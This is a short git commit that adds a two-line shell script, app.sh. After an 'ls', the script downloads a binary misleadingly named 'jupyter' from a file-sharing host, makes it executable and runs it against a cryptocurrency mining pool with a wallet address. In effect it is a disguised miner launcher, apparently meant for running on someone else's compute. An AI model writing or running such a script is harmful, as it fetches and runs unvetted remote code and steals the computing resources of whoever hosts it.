a3c1c5a71c640e82b5164f21da1a5fbbaf2a67db
Hanaang Offical <112566796+hanaang@users.noreply.github.com>
2022-10-19 06:19:57 +0700

    Create app.sh

---
+++ app.sh
@@ -0,0 +1,2 @@
+ls
+wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmk2nadysceg79q8gxteg.AMD-Ryzen
